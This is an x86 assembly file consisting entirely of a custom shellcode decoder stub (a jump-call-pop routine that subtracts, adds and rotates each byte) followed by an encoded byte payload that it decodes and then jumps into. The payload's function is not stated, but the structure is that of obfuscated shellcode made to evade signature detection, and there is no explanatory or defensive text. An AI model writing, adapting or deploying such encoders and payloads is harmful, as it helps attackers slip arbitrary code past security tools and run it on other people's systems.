global _start
section .text progbits alloc exec write align=16
_start:
	xor ebx, ebx
	mov cl, 0x01	;lekhchaf
	mov dl, 0x37
	jmp call_decoder
decoder:
	pop esi
boucle:
	cmp byte [esi], 0xff
	jz End
	cmp byte [esi], 0x38
	jb greater
	sub byte [esi], dl
	jmp next	
greater:
	mov al, byte [esi]
	add al, 199
	mov byte [esi], al	
next:
	mov bl, byte [esi]
	ror bl, cl
	mov byte [esi], bl
	inc esi
	jmp boucle

End:
	xor eax, eax
	mov byte [esi], al
	jmp short shell
call_decoder:
	call decoder
	shell:		db	0x0d,0x3b,0xe7,0xd2,0x38,0x99,0xee,0xa9,0xe8,0x21,0x97,0x0d,0x45,0xe7,0xd2,0x38,0x99,0xca,0x28,0xfa,0xd9,0x09,0x93,0x21,0x29,0x21,0x09,0x03,0xfd,0x09,0x17,0x4a,0xfe,0x98,0x41,0xd2,0x38,0x5e,0x5a,0x6a,0x98,0x3d,0x9c,0x38,0xd2,0x38,0x5c,0x0d,0x39,0xed,0x0d,0x3f,0xe7,0xd2,0x38,0x98,0x39,0xd2,0x38,0x99,0xb8,0xd7,0x09,0x27,0x07,0x03,0x21,0x09,0xfb,0x0b,0x15,0x95,0x09,0x23,0x1f,0x1d,0x95,0x09,0x95,0x95,0x95,0x95,0x4a,0xfe,0xd7,0x4a,0xfc,0x05,0xa8,0x29,0x21,0xd7,0x09,0x09,0x17,0x93,0x21,0x09,0x13,0x95,0x03,0xfd,0x09,0x95,0x1d,0x21,0x05,0x09,0x93,0x99,0xa1,0x9b,0x09,0x9b,0x93,0x9f,0xa7,0x09,0x99,0x93,0x99,0xa9,0x09,0xab,0x95,0x95,0xa7,0x09,0x09,0x21,0x21,0x19,0x4a,0xfa,0x99,0xb8,0xd7,0xd9,0xdd,0x4a,0xfa,0x98,0x4d,0xd2,0x38,0x0d,0x39,0xe7,0xd2,0x38,0xff
